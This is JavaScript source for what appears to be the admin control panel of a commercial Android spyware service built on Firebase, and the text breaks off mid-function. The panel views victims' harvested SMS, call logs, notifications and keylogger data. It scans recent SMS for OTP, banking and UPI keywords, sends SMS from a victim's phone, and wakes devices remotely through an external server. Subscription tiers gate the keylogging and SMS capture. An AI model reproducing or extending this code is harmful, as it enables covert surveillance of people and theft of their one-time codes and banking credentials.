import { auth, db, signInWithEmailAndPassword, onAuthStateChanged, signOut, ref, onValue, remove, update, push, set, serverTimestamp, off, get, query, limitToLast, orderByKey, endAt, onChildAdded, onChildChanged } from './firebase-config.js';

// ==========================================
// PART 1: DOM ELEMENTS & GLOBAL VARIABLES
// ==========================================

const loginContainer = document.getElementById('login-container');
const dashboard = document.getElementById('dashboard');
const userList = document.getElementById('user-list');
const userSearchInput = document.getElementById('user-search-input'); // New Search Input
const scanBankingBtn = document.getElementById('scan-banking-btn'); // New Scan Button
const mainContentTitle = document.getElementById('main-content-title');
const detailsView = document.getElementById('details-view');
const categoryButtonsContainer = document.querySelector('.category-buttons');
const sidebar = document.querySelector('.sidebar');
const overlay = document.getElementById('overlay');
const dataModal = document.getElementById('data-modal');
const modalDataDisplayArea = document.getElementById('modal-data-display-area');

const sendNotificationAllBtn = document.getElementById('send-notification-all-btn');
const sendNotificationPaidBtn = document.getElementById('send-notification-paid-btn'); // New Button
const sendSingleUserNotificationBtn = document.getElementById('send-single-user-notification-btn');
const pingSingleUserBtn = document.getElementById('ping-single-user-btn'); // Added FCM Ping Button Single
const pingAllUsersBtn = document.getElementById('ping-all-users-btn'); // Added FCM Ping Button Global
const adminSendSmsBtn = document.getElementById('admin-send-sms-btn');
const adminSendSmsModal = document.getElementById('admin-send-sms-modal');
const executeAdminSendSmsBtn = document.getElementById('execute-admin-send-sms-btn');
const notificationModal = document.getElementById('notification-modal');
const notificationMessageInput = document.getElementById('notification-message-input');
const sendNotificationSubmitBtn = document.getElementById('send-notification-submit-btn');

const menuBtn = document.getElementById('menu-btn');
const toggleSidebarBtn = document.getElementById('toggle-sidebar-btn');
const sidebarTitle = document.getElementById('sidebar-title');
const deleteUserBtn = document.getElementById('delete-user-btn');
const clearDeviceDataBtn = document.getElementById('clear-device-data-btn');
const freezeBtn = document.getElementById('freeze-btn');
const unfreezeBtn = document.getElementById('unfreeze-btn');
const appVisibilityBtn = document.getElementById('app-visibility-btn');
const deleteUserModal = document.getElementById('delete-user-modal');
const confirmUserDeleteBtn = document.getElementById('confirm-user-delete-btn');
const cancelUserDeleteBtn = document.getElementById('cancel-user-delete-btn');
const deleteUserInfo = document.getElementById('delete-user-info');
const deletedLogsBtn = document.getElementById('deleted-logs-btn');
const deletedLogsModal = document.getElementById('deleted-logs-modal');
const deletedLogsTableBody = document.getElementById('deleted-logs-table-body');
const clearAllFreeUsersBtn = document.getElementById('clear-all-free-users-btn');
const cleanupMediaFreeUsersBtn = document.getElementById('cleanup-media-free-users-btn');
const emailVerificationManagerBtn = document.getElementById('email-verification-manager-btn');
const securityCleanupPaidBtn = document.getElementById('security-cleanup-paid-btn');
const blockFeaturesFreeUsersBtn = document.getElementById('block-features-free-users-btn');
const globalResetAdminDataBtn = document.getElementById('global-reset-admin-data-btn');

// Global Free Locks Elements
const globalFreeLocksModal = document.getElementById('global-free-locks-modal');
const globalUnlockDateInput = document.getElementById('global-unlock-date');
const globalLockSmsCheckbox = document.getElementById('global-lock-sms');
const globalLockCallsCheckbox = document.getElementById('global-lock-calls');
const globalLockNotificationsCheckbox = document.getElementById('global-lock-notifications');
const globalLockKeyloggerCheckbox = document.getElementById('global-lock-keylogger');
const globalUnlockBtn = document.getElementById('global-unlock-btn');
const globalLockBtn = document.getElementById('global-lock-btn');

// Manage Locks Elements
const manageLocksBtn = document.getElementById('manage-locks-btn');
const manageLocksModal = document.getElementById('manage-locks-modal');
const saveLocksBtn = document.getElementById('save-locks-btn');
const cancelLocksBtn = manageLocksModal ? manageLocksModal.querySelector('.modal-close-btn-secondary') : null;
const lockUnlockDateInput = document.getElementById('lock-unlock-date');
const lockSmsCheckbox = document.getElementById('lock-sms');
const lockCallsCheckbox = document.getElementById('lock-calls');
const lockNotificationsCheckbox = document.getElementById('lock-notifications');
const lockKeyloggerCheckbox = document.getElementById('lock-keylogger');


// Smart Block Manager Elements
const smartBlockBtn = document.getElementById('smart-block-manager-btn');
const smartBlockModal = document.getElementById('smart-block-modal');
const smartBlockedCount = document.getElementById('smart-blocked-count');
const smartActiveCount = document.getElementById('smart-active-count');
const smartApplyTimerBtn = document.getElementById('smart-apply-timer-btn');
const smartBlockHours = document.getElementById('smart-block-hours');
const smartBlockDate = document.getElementById('smart-block-date');
const smartTableBody = document.getElementById('smart-block-table-body');
const smartTimerStatus = document.getElementById('smart-timer-status');

// Ghost Accounts Elements
const ghostAccountsBtn = document.getElementById('ghost-accounts-btn');
const ghostAccountsModal = document.getElementById('ghost-accounts-modal');
const checkUserStatsBtn = document.getElementById('check-user-stats-btn'); // New Stats Button
const ghostAccountsTableBody = document.getElementById('ghost-accounts-table-body');
const deleteAllGhostsBtn = document.getElementById('delete-all-ghosts-btn');
const ghostCountLabel = document.getElementById('ghost-count-label');
const downloadGhostsPdfBtn = document.getElementById('download-ghosts-pdf-btn');

// Store ghost accounts data for PDF download
let currentGhostAccounts = [];

// --- NEW FEATURE: Check User Stats (Paid vs Free) ---
if (checkUserStatsBtn) {
    checkUserStatsBtn.onclick = async () => {
        const originalText = checkUserStatsBtn.innerHTML;
        const descSpan = checkUserStatsBtn.querySelector('.desc');
        
        if (descSpan) {
            descSpan.innerText = 'Analyzing...';
            checkUserStatsBtn.style.opacity = '0.7';
        } else {
             checkUserStatsBtn.innerHTML = '<span style="font-size: 12px;">scanning...</span>';
        }
        checkUserStatsBtn.disabled = true;

        try {
            const userSnapshot = await get(ref(db, 'user'));
            if (!userSnapshot.exists()) {
                alert("No users found in database.");
                return;
            }

            const users = userSnapshot.val();
            let totalUsers = 0;
            let paidUsers = 0;
            let freeUsers = 0;
            const paidUsersList = [];

            for (const uid of Object.keys(users)) {
                const userChildren = users[uid];
                if (!userChildren) continue;
                
                totalUsers++;
                let hasSubscription = false;
                let userEmail = "Unknown";
                let subType = "N/A";

                // Check Subscription & Email
                Object.keys(userChildren).forEach(childKey => {
                    // Check direct property (User Level)
                    if (childKey === 'subscription') {
                         hasSubscription = true;
                         subType = "User Level";
                    }
                    if (childKey === 'profile' && userChildren.profile.email) {
                        userEmail = userChildren.profile.email;
                    }

                    // Check child/device level
                    const childData = userChildren[childKey];
                    if (childData && typeof childData === 'object') {
                        if (childData.subscription) {
                            hasSubscription = true;
                            subType = "Child/Device Level";
                        }
                        if (childData.profile && childData.profile.email) {
                            // Prefer child email if user email is unknown
                            if (userEmail === "Unknown") userEmail = childData.profile.email;
                        }
                    }
                });

                if (hasSubscription) {
                    paidUsers++;
                    paidUsersList.push({
                        uid: uid,
                        email: userEmail,
                        type: subType
                    });
                } else {
                    freeUsers++;
                }
            }

            // Show Stats & Ask for Download
            const message = `📊 User Statistics Report\n\n------------------------------\n👥 Total Users:  ${totalUsers}\n\n✅ Paid Users:   ${paidUsers}\n❌ Free Users:   ${freeUsers}\n------------------------------\n\nDo you want to download the PAID USERS list (PDF)?`;

            if (confirm(message)) {
                generatePaidUsersPDF(paidUsersList, paidUsers, freeUsers, totalUsers);
            }

        } catch (error) {
            console.error("Stats Error:", error);
            alert("Error calculating stats: " + error.message);
        } finally {
            checkUserStatsBtn.innerHTML = originalText;
            checkUserStatsBtn.disabled = false;
            checkUserStatsBtn.style.opacity = '1';
        }
    };
}

function generatePaidUsersPDF(dataList, paidCount, freeCount, totalCount) {
    try {
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();
        const pageWidth = doc.internal.pageSize.getWidth();
        
        let yPos = 20;

        // Title
        doc.setFontSize(18);
        doc.text("Paid Users Report", pageWidth / 2, yPos, { align: "center" });
        yPos += 10;

        // Date
        doc.setFontSize(10);
        doc.text(`Generated: ${new Date().toLocaleString()}`, pageWidth / 2, yPos, { align: "center" });
        yPos += 15;

        // Summary
        doc.setFontSize(12);
        doc.text(`Total Users: ${totalCount}`, 14, yPos);
        yPos += 7;
        doc.text(`Paid: ${paidCount} | Free: ${freeCount}`, 14, yPos);
        yPos += 15;

        // Table Header
        doc.setFontSize(9); // Sligthly smaller font for header
        doc.setFillColor(52, 152, 219); // Blue Header
        doc.rect(14, yPos, 180, 8, 'F');
        doc.setTextColor(255, 255, 255);
        doc.text("#", 16, yPos + 6);
        doc.text("UID", 25, yPos + 6); // Moved sligthly left
        doc.text("Email / ID", 90, yPos + 6); // Adjusted to make room
        doc.text("Type", 160, yPos + 6);
        
        yPos += 10;
        doc.setTextColor(0, 0, 0);

        // List
        doc.setFontSize(8); // Smaller font for data to fit full UID
        dataList.forEach((user, index) => {
            // Page Break Check
            if (yPos > 280) {
                doc.addPage();
                yPos = 20;
            }

            doc.text(`${index + 1}`, 16, yPos);
            doc.text(user.uid, 25, yPos); // Full UID, no truncation
            doc.text(user.email || "N/A", 90, yPos);
            doc.text(user.type || "-", 160, yPos);
            
            yPos += 8;
            // Divider Line
            doc.setDrawColor(200, 200, 200);
            doc.line(14, yPos - 5, 194, yPos - 5); 
        });

        // Copyright Footer
        const pageCount = doc.internal.getNumberOfPages();
        for(let i = 1; i <= pageCount; i++) {
            doc.setPage(i);
            doc.setFontSize(8);
            doc.setTextColor(150);
            doc.text(`CONFIDENTIAL - Admin Control Panel - Page ${i} of ${pageCount}`, pageWidth / 2, 290, { align: "center" });
        }

        doc.save(`Paid_Users_Report_${new Date().toISOString().slice(0,10)}.pdf`);

    } catch (e) {
        console.error("PDF Generate Error:", e);
        alert("Failed to generate PDF. Make sure jsPDF script is loaded.\n" + e.message);
    }
}

// Limits Elements
const limitsContainer = document.getElementById('limits-settings-container');
const limitVideoInput = document.getElementById('limit-video');
const limitAudioInput = document.getElementById('limit-audio');
const limitImageInput = document.getElementById('limit-image');
const limitScreenshotInput = document.getElementById('limit-screenshot');
const limitSmsInput = document.getElementById('limit-sms');
const updateLimitsBtn = document.getElementById('update-limits-btn');
// Plan Buttons
const setPlanFreeBtn = document.getElementById('set-plan-free');
const setPlanBasicBtn = document.getElementById('set-plan-basic');
const setPlanGoldBtn = document.getElementById('set-plan-gold');
const setPlanPlatinumBtn = document.getElementById('set-plan-platinum');

let limitsListener = null;

let activeDataListener = null;
let activeScrollListener = null; // New: Track scroll listener to remove it later
let paginationState = {
    isLoading: false,
    oldestKey: null,
    hasMore: true,
    path: null,
    category: null
};

let deletedLogsListener = null;
let selectedUserInfo = {};
let configRef = null;
let configListener = null;
let appVisibilityRef = null;
let appVisibilityListener = null;
let notificationTarget = {};
let currentDownloadableData = [];

// Chat Badge Variables
let chatUnreadListener = null;
let lastReadMessageCount = 0;

// Scan Alerts Set
let usersWithAlerts = new Set();
const SENSITIVE_KEYWORDS = ['otp', 'bank', 'credit', 'debit', 'password', 'login', 'auth', 'transaction', 'amount', 'verify', 'code', 'upi', 'paytm', 'phonepe', 'gpay'];

// ==========================================
// SEARCH FUNCTIONALITY
// ==========================================
if (userSearchInput) {
    userSearchInput.addEventListener('input', (e) => {
        const searchTerm = e.target.value.toLowerCase().trim();
        const allUserItems = document.querySelectorAll('.user-list li'); // Get all currently rendered list items

        allUserItems.forEach(item => {
            // The item text usually contains the Email
            const emailText = item.textContent.toLowerCase();
            // We can also store UID in a data attribute if not already visible, 
            // but usually the list shows email. If UID is needed, we ensure it's searchable.
            const uid = item.getAttribute('data-uid') ? item.getAttribute('data-uid').toLowerCase() : '';
            
            if (emailText.includes(searchTerm) || uid.includes(searchTerm)) {
                item.style.display = 'block';
            } else {
                item.style.display = 'none';
            }
        });
    });
}

if (scanBankingBtn) {
    scanBankingBtn.addEventListener('click', async () => {
        const originalText = scanBankingBtn.innerHTML;
        scanBankingBtn.innerHTML = 'Scanning...';
        scanBankingBtn.disabled = true;

        try {
            await scanForAllSensitiveData();
        } catch (error) {
            console.error(error);
            alert("Scan failed: " + error.message);
        } finally {
            scanBankingBtn.innerHTML = originalText;
            scanBankingBtn.disabled = false;
        }
    });
}

async function scanForAllSensitiveData() {
    const statusLabel = document.createElement('div');
    statusLabel.id = 'scan-status-label';
    statusLabel.style.color = '#f1c40f';
    statusLabel.style.fontSize = '0.8rem';
    statusLabel.style.marginTop = '5px';
    statusLabel.innerText = "Initializing scan...";
    scanBankingBtn.parentNode.appendChild(statusLabel);

    try {
        // 1. Get all users
        const snapshot = await get(ref(db, 'All_Users_List'));
        if (!snapshot.exists()) {
            statusLabel.innerText = "No users found.";
            setTimeout(() => statusLabel.remove(), 3000);
            return;
        }

        const allUsers = snapshot.val();
        const uids = Object.keys(allUsers);
        let foundCount = 0;
        let processedCount = 0;

        statusLabel.innerText = `Scanning ${uids.length} users...`;

        // Batch processing to prevent blocking UI
        const BATCH_SIZE = 3;
        
        for (let i = 0; i < uids.length; i += BATCH_SIZE) {
            const batch = uids.slice(i, i + BATCH_SIZE);
            
            const promises = batch.map(async (uid) => {
                try {
                    // Fetch user root (careful with large data)
                    // If we can get devices from All_Users_List, use them to query specific paths
                    // But assume we fetch user root for simplicity as per current structure
                    const userRef = ref(db, `user/${uid}`);
                    // Optimization: Try to get just child keys first? query(userRef, shallow=true) REST only.
                    // For JS SDK, we just fetch. If too heavy, we might need a different strategy.
                    
                    const userSnap = await get(userRef);
                    if (!userSnap.exists()) return;

                    const devices = userSnap.val();
                    let hasSensitive = false;

                    // Iterate Devices
                    const deviceKeys = Object.keys(devices);
                    for (const deviceId of deviceKeys) {
                        if (hasSensitive) break;
                        const d = devices[deviceId];
                        if (!d || typeof d !== 'object') continue;

                        // Helper to check content
                        const checkContent = (item) => {
                            if (!item) return false;
                            
                            // Decompress and Normalize
                            let data = item;
                            if (typeof data === 'string') {
                                data = decompressData(data);
                            } else if (item.data) { // Handle wrapped {data: '...'}
                                const dec = decompressData(item.data);
                                try { data = JSON.parse(dec); } catch { data = dec; }
                                // If parsing fails, data is the string
                            }

                            // Extract Text
                            let text = "";
                            let timestamp = 0;

                            if (typeof data === 'string') {
                                text = data;
                                // Try to extract timestamp from key if available in item context, 
                                // but 'item' passed here is usually just the value.
                                // We need the key or timestamp field. 
                                // Let's rely on data object structure if possible.
                            } else if (typeof data === 'object') {
                                text = (data.smsBody || data.body || data.text || data.message || JSON.stringify(data));
                                // Try to get timestamp
                                timestamp = data.date || data.time || data.timestamp || 0;
                            }
                            
                            // If timestamp is missing in body, we might miss the 3-day window check here.
                            // But usually, SMS objects have 'time' or 'date'.
                            // If timestamp is 0, we can't filter by time, so we might check it anyway or skip?
                            // Let's assume if no timestamp, we check it to be safe (or rely on list slicing earlier).
                            // Wait, the user wants "last 3 days". 
                            // We should filter the list BEFORE mapping.
                            
                            text = text.toLowerCase();

                            // 1. Check Explicit Tags
                            if (text.includes('[banking]') || text.includes('[otp]') || text.includes('[critical]')) return true;

                            // 2. Check Keywords
                            return SENSITIVE_KEYWORDS.some(k => text.includes(k));
                        };

                        // Check SMS ONLY (Last 3 Days)
                        if (d.sms) {
                            const threeDaysAgo = Date.now() - (3 * 24 * 60 * 60 * 1000);
                            const smsList = Object.entries(d.sms); // Get keys and values to check timestamps keys if needed
                            
                            // Filter for last 3 days
                            // Note: Firebase push keys represent time, or the object has a timestamp.
                            // We will try to filter by object timestamp first.
                            
                            const recentSMS = smsList.filter(([key, val]) => {
                                let time = 0;
                                let data = val;
                                // Basic cleanup to find time
                                if(data.data) {
                                     // We might need to decompress to find time, which is slow.
                                     // Strategy: Check if key is a Push ID (timestamped)
                                     try {
                                        time = getRealTimestamp(key, null);
                                     } catch(e) { time = 0; }
                                } else {
                                     time = getRealTimestamp(key, data);
                                }
                                
                                // If time is detected, check window. If not (0), include it just in case? 
                                // Better to include if uncertain to avoid missing alerts, 
                                // BUT the user wants speed. Let's assume valid timestamps exist.
                                if (time > 0) return time > threeDaysAgo;
                                return true; // Keep if no time found (fallback)
                            });

                            // Optimization: Don't check ALL if too many. Cap at 100 recent valid ones?
                            // User said "3 days", so we try to respect that, but cap at 150 to prevent freezing.
                            const finalCheckList = recentSMS.slice(-150).map(e => e[1]);

                            if (finalCheckList.some(item => checkContent(item))) hasSensitive = true;
                        }

                        // Notifications & Keylogs REMOVED as per request to speed up scan

                    }

                    if (hasSensitive) {
                        usersWithAlerts.add(uid);
                        foundCount++;
                    }
                } catch (err) {
                    console.warn(`Scan error for ${uid}:`, err);
                }
            });

            await Promise.all(promises);
            processedCount += batch.length;
            statusLabel.innerText = `Scanned ${processedCount}/${uids.length} (Found: ${foundCount})`;
        }

        // 3. Update Sidebar
        updateSidebarAlerts();
        
        statusLabel.innerText = `Done! Found ${foundCount} alerts.`;
        if (foundCount > 0) {
            statusLabel.style.color = '#2ecc71';
        }
        setTimeout(() => statusLabel.remove(), 5000);

    } catch (error) {
        console.error(error);
        statusLabel.innerText = "Error: " + error.message;
        statusLabel.style.color = 'red';
    }
}

function updateSidebarAlerts() {
    const listItems = document.querySelectorAll('.user-list-item');
    listItems.forEach(li => {
        const uid = li.getAttribute('data-uid');
        if (usersWithAlerts.has(uid)) {
            li.classList.add('has-alert');
        } else {
            li.classList.remove('has-alert');
        }
    });
}


// Ensure 'data-uid' is added when creating list items (Enhancement to existing renderUserList logic)
// We need to find where li elements are created. 
// Instead of rewriting the huge render function, we will inject a small observer or just rely on text content for now
// But for best results, let's update the Search logic to be robust.

// --- END SEARCH FUNCTIONALITY ---

// ==========================================
// PART 2: HELPER FUNCTIONS (MODAL & DATA)
// ==========================================

// --- 1. MODAL (POPUP) FUNCTIONS ---
async function downloadCurrentData(category) {
    if (!currentDownloadableData || currentDownloadableData.length === 0) {
        alert("No data to download");
        return;
    }

    if (!window.jspdf || !window.jspdf.jsPDF) {
        alert("PDF Library not loaded. Please refresh the page.");
        return;
    }

    const { jsPDF } = window.jspdf;
    const doc = new jsPDF();
    
    // Page Settings
    const pageWidth = doc.internal.pageSize.getWidth();
    const pageHeight = doc.internal.pageSize.getHeight();
    const margin = 10;
    const maxLineWidth = pageWidth - (margin * 2);
    let y = 20;

    // Header
    const timestamp = new Date().toLocaleString();
    doc.setFontSize(16);
    doc.text(`${category.toUpperCase()} REPORT`, margin, y);
    y += 10;
    doc.setFontSize(10);
    doc.text(`Generated on: ${timestamp}`, margin, y);
    y += 10;
    doc.setLineWidth(0.5);
    doc.line(margin, y, pageWidth - margin, y);
    y += 10;

    // Content Loop
    doc.setFont("helvetica", "normal");
    doc.setFontSize(10);

    currentDownloadableData.forEach((item, index) => {
        const d = item.data;
        if(!d) return;

        let time = formatTimestamp(getRealTimestamp(item.key, d)) || "Unknown Time";
        
        // header line for item
        const itemHeader = `[${index + 1}] ${time}`;
        
        if (y > pageHeight - 20) { doc.addPage(); y = 20; }
        
        doc.setFont("helvetica", "bold");
        doc.text(itemHeader, margin, y);
        y += 5;
        doc.setFont("helvetica", "normal");

        // Format body based on category
        let bodyText = "";
        
        if (category === 'sms') {
             bodyText = `Sender: ${d.smsAddress || d.address}\nType: ${d.type}\nMessage: ${d.smsBody || d.body}`;
        } else if (category === 'calllogs') {
             bodyText = `Info: ${d.phoneNumber} (${d.name || 'Unknown'})\nType: ${d.callType || d.type}\nDuration: ${d.duration}s`;
        } else if (category === 'notifications') {
             bodyText = `App: ${d.appName}\nTitle: ${d.title}\nText: ${d.text}`;
        } else if (category === 'userlog') {
             bodyText = formatPrettyText(d).replace(/<br>/g, '\n').replace(/<b>/g, '').replace(/<\/b>/g, '');
        } else {
             bodyText = JSON.stringify(d, null, 2);
        }

        // Split text to fit page
        const splitText = doc.splitTextToSize(bodyText, maxLineWidth);
        
        // Check if page break needed
        if (y + (splitText.length * 5) > pageHeight - 10) {
            doc.addPage();
            y = 20;
        }

        doc.text(splitText, margin, y);
        y += (splitText.length * 5) + 5; // spacing
        
        // Separator
        if (y > pageHeight - 10) { doc.addPage(); y = 20; }
        doc.setDrawColor(200);
        doc.line(margin, y, pageWidth - margin, y);
        doc.setDrawColor(0);
        y += 10;
    });

    const filename = `${category}_${new Date().getTime()}.pdf`;
    doc.save(filename);
}

// --- 1. MODAL (POPUP) FUNCTIONS ---
function openModal(modalElement) {
    if (modalElement) {
        modalElement.style.display = 'flex';
        // Force reflow
        void modalElement.offsetWidth;
        document.body.classList.add('modal-open');

        // History Management for Data Modal (Full Screen View)
        if (modalElement.id === 'data-modal') {
            history.pushState({ modalOpen: true, modalId: 'data-modal' }, "", "#view");
        }
    }
}

function closeModal(modalElement) {
    if (modalElement) {
        modalElement.style.display = 'none';
        document.body.classList.remove('modal-open');
        detachListeners(); 
    }
}

// Handle Back Button (Browser & Mobile)
window.addEventListener('popstate', (event) => {
    const dataModal = document.getElementById('data-modal');
    // If back button is pressed, close the data modal if it's open
    if (dataModal && dataModal.style.display === 'flex') {
        closeModal(dataModal);
    }
});

function detachListeners() {
    if (activeDataListener) {
        if (typeof activeDataListener.cleanup === 'function') {
             activeDataListener.cleanup();
        } else if (activeDataListener.ref && activeDataListener.callback) {
            off(activeDataListener.ref, 'value', activeDataListener.callback);
        }
        activeDataListener = null;
    }
    // New: Disable scroll listener if active
    if (activeScrollListener) {
        modalDataDisplayArea.removeEventListener('scroll', activeScrollListener);
        activeScrollListener = null;
    }
    // Reset State
    paginationState = { isLoading: false, oldestKey: null, hasMore: true, path: null, category: null };
}

// --- 2. DECOMPRESSION LOGIC (FINAL ROBUST VERSION) ---
function decompressData(data) {
    // 1. Basic Checks
    if (!data || typeof data !== 'string') return data;
    // Agar data GZIP header (H4s/eJ) se shuru nahi hota, to shayad normal text hai
    if (!data.startsWith('H4s') && !data.startsWith('eJ')) return data;

    try {
        let cleanData = data;

        // 2. Aggressive Cleaning (Sabse Zaroori)
        // URL encoded data ko decode karein
        try { cleanData = decodeURIComponent(cleanData); } catch (e) {}
        
        // Spaces ko + banayein (Android bug fix)
        cleanData = cleanData.replace(/ /g, '+');
        // URL Safe Base64 ko Standard Base64 banayein
        cleanData = cleanData.replace(/-/g, '+').replace(/_/g, '/');
        // New lines aur tabs hatayein
        cleanData = cleanData.replace(/[\n\r\t]/g, "");

        // 3. Base64 Decode
        const binaryString = atob(cleanData);
        const charData = binaryString.split('').map(x => x.charCodeAt(0));
        const binData = new Uint8Array(charData);
        
        // 4. Pako Library Check
        if (!window.pako) { 
            return "Error: Pako Library Missing (Check HTML)"; 
        }
        
        // 5. Decompress
        const decompressed = window.pako.ungzip(binData, { to: 'string' });
        
        // 6. JSON Parse (Agar object hai to object banao, nahi to string)
        try { return JSON.parse(decompressed); } catch { return decompressed; }

    } catch (e) {
        console.warn("Decompression failed, showing original:", e);
        return data; // Fail hone par bhi original data dikhao
    }
}

function formatPrettyText(obj) {
    if (typeof obj === 'string') return obj;
    if (typeof obj === 'object' && obj !== null) {
        return Object.entries(obj).map(([k, v]) => `<b>${k}:</b> ${v}`).join('<br>');
    }
    return obj;
}

function getRealTimestamp(key, dataItem) {
    // 1. First Priority: Check for 'dateTime' (Matches Android App Location.kt)
    if (dataItem && dataItem.dateTime) return dataItem.dateTime;
    
    // 2. Second Priority: Check for common variants
    if (dataItem && dataItem.time) return dataItem.time;
    if (dataItem && dataItem.timestamp) return dataItem.timestamp;

    // 3. Third Priority: Extract Timestamp from Firebase Push Key (if generic data)
    const PUSH_CHARS = "-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz";
    if (typeof key === 'string' && key.length === 20) {
        let id = key.substring(0, 8);
        let timestamp = 0;
        for (let i = 0; i < 8; i++) {
            timestamp = timestamp * 64 + PUSH_CHARS.indexOf(id.charAt(i));
        }
        return timestamp; // Returns milliseconds
    }

    // 4. Final Fallback: Return null (Do NOT return current time)
    return null;
}

function formatTimestamp(ts) {
    if (!ts) return ''; // Empty string if no time found
    
    // If it's already a formatted string (from Android's dateTime), return it
    if (typeof ts === 'string' && (ts.includes(':') || ts.includes('-'))) {
        return ts;
    }

    // Otherwise, parse numeric timestamp
    const d = new Date(ts);
    if (isNaN(d.getTime())) return ts; // Return original if parsing fails

    // Format: DD/MM/YYYY HH:MM AM/PM
    const day = String(d.getDate()).padStart(2, '0');
    const month = String(d.getMonth() + 1).padStart(2, '0');
    const year = d.getFullYear();
    let hours = d.getHours();
    const minutes = String(d.getMinutes()).padStart(2, '0');
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12;
    hours = hours ? hours : 12; 
    return `${day}/${month}/${year} ${hours}:${minutes} ${ampm}`;
}

// Helper function to create expiry alert container (for 3-day expiry logic)
function createExpiryAlertContainer() {
    const container = document.createElement('div');
    container.id = 'expiry-alert-container';
    container.className = 'expiry-alert-container';
    
    // Insert at the top of details-view
    const detailsView = document.getElementById('details-view');
    if (detailsView) {
        detailsView.insertBefore(container, detailsView.firstChild);
    }
    return container;
}

// ==========================================
// PART 2.5: NOTIFICATION LOGIC
// ==========================================

sendNotificationAllBtn.addEventListener('click', () => {
    notificationTarget = { type: 'all' };
    document.getElementById('notification-modal-title').textContent = 'Send Notification to All Users';
    openModal(notificationModal);
});

// New Event Listener for Paid Users Notification
if (sendNotificationPaidBtn) {
    sendNotificationPaidBtn.addEventListener('click', () => {
        notificationTarget = { type: 'paid' };
        document.getElementById('notification-modal-title').textContent = 'Notify Only Paid Users 💎';
        openModal(notificationModal);
    });
}

sendSingleUserNotificationBtn.addEventListener('click', () => {
    if (!selectedUserInfo.userId) {
        alert("Please select a user first.");
        return;
    }
    notificationTarget = { type: 'single', userId: selectedUserInfo.userId, userName: selectedUserInfo.userName };
    document.getElementById('notification-modal-title').textContent = `Send Notification to ${selectedUserInfo.userName}`;
    openModal(notificationModal);
});

// === FCM WAKE-UP PING LOGIC ===
  // This now connects to our local Node.js server (http://localhost:3000)

  if (pingSingleUserBtn) {
      pingSingleUserBtn.addEventListener('click', async () => {
          if (!selectedUserInfo.userId) {
              alert("No user selected.");
              return;
          }

          try {
              // Fetch token from user's node
              const userRef = ref(db, `user/${selectedUserInfo.userId}/fcm_token`);
              const snapshot = await get(userRef);
              const token = snapshot.val();

              if (!token) {
                  alert("FCM Token not found for this user. The user needs to open the app once after the recent update.");
                  return;
              }

              // Send Ping via Render Node.js Server
              const response = await fetch('https://admin-github-io-1.onrender.com/send-ping', {
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json'
                  },
                  body: JSON.stringify({
                      token: token,
                      action: 'WAKE_UP_NOW'
                  })
              });

              if (response.ok) {
                  alert("Wake-up Ping command sent successfully to user's device!");
              } else {
                  const errorData = await response.json();
                  alert("Failed to send Ping. Check terminal where Node server is running. Error: " + (errorData.error || "Unknown"));
              }
          } catch (error) {
              console.error("Error pinging user:", error);
              alert("Error sending Ping: " + error.message + "\n\nIs your Node.js (fcm-server.js) running in the terminal?");
          }
      });
  }

  if (pingAllUsersBtn) {
      pingAllUsersBtn.addEventListener('click', async () => {
          const confirmPing = confirm("Are you sure you want to wake up ALL active devices at once?");
          if (!confirmPing) return;

          try {
              // Send Global Ping via Render Node.js Server
              const response = await fetch('https://admin-github-io-1.onrender.com/send-ping-all', {
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json'
                  },
                  body: JSON.stringify({
                      action: 'WAKE_UP_NOW'
                  })
              });

              if (response.ok) {
                  alert("Wake-up Ping command sent to ALL devices successfully!");
              } else {
                  const errorData = await response.json();
                  alert("Failed to ping all devices. Error: " + (errorData.error || "Unknown"));
              }
          } catch (error) {
              console.error("Error global ping:", error);
              alert("Error: " + error.message + "\n\nIs your Node.js (fcm-server.js) running in the terminal?");
          }
      });
  }

if (adminSendSmsBtn) {
    adminSendSmsBtn.addEventListener('click', () => {
        if (!selectedUserInfo.userId || !selectedUserInfo.childKey || selectedUserInfo.childKey === 'all') {
            alert("Please select a specific device first.");
            return;
        }
        openModal(adminSendSmsModal);
    });
}

if (executeAdminSendSmsBtn) {
    executeAdminSendSmsBtn.addEventListener('click', async () => {
        const targetNumber = document.getElementById('admin-sms-target-number').value.trim();
        const targetMessage = document.getElementById('admin-sms-target-message').value.trim();

        if (!targetNumber || !targetMessage) {
            alert("Please enter both phone number and message.");
            return;
        }

        const originalText = executeAdminSendSmsBtn.innerText;
        executeAdminSendSmsBtn.innerText = "Sending...";
        executeAdminSendSmsBtn.disabled = true;

        try {
            const { userId, childKey } = selectedUserInfo;
            const commandRef = ref(db, `user/${userId}/${childKey}/smsCommand/params`);
            
            await set(commandRef, {
                send: true,
                phoneNumber: targetNumber,
                message: targetMessage,
                timestamp: serverTimestamp()
            });

            alert("SMS Command sent successfully!");
            closeModal(adminSendSmsModal);
            document.getElementById('admin-sms-target-number').value = '';
            document.getElementById('admin-sms-target-message').value = '';
        } catch (error) {
            console.error("Error sending SMS command:", error);
            alert("Failed to send SMS command: " + error.message);
        } finally {
            executeAdminSendSmsBtn.innerText = originalText;
            executeAdminSendSmsBtn.disabled = false;
        }
    });
}

sendNotificationSubmitBtn.addEventListener('click', () => {
    const message = notificationMessageInput.value.trim();
    if (!message) {
        alert("Please enter a message.");
        return;
    }

    if (notificationTarget.type === 'all') {
        sendNotificationToAll(message);
    } else if (notificationTarget.type === 'paid') {
        sendNotificationToPaidUsers(message);
    } else if (notificationTarget.type === 'single') {
        sendNotificationToUser(notificationTarget.userId, message);
    }
});

async function sendNotificationToPaidUsers(message) {
    try {
        const snapshot = await get(ref(db, 'user')); // Fetch full user node to check subscription
        if (!snapshot.exists()) {
            alert("No users found.");
            return;
        }

        const users = snapshot.val();
        const updates = {};
        const notificationPayload = {
            title: "Premium Notification 💎",
            message: message,
            timestamp: serverTimestamp(),
            read: false
        };

        const notificationId = push(ref(db, 'temp')).key; // Generate unique ID once or per user? Per notification instance is better.
        let paidCount = 0;
        let deviceCount = 0;

        // Iterate through all users
        Object.keys(users).forEach(uid => {
            const userRef = users[uid];
            if (!userRef) return;

            // 1. Check User Level Subscription (Account Wide)
            let isPaidAccount = false;
            let paidCountAdded = false;

            if (userRef.subscription) {
                isPaidAccount = true; 
            }

            Object.keys(userRef).forEach(childKey => {
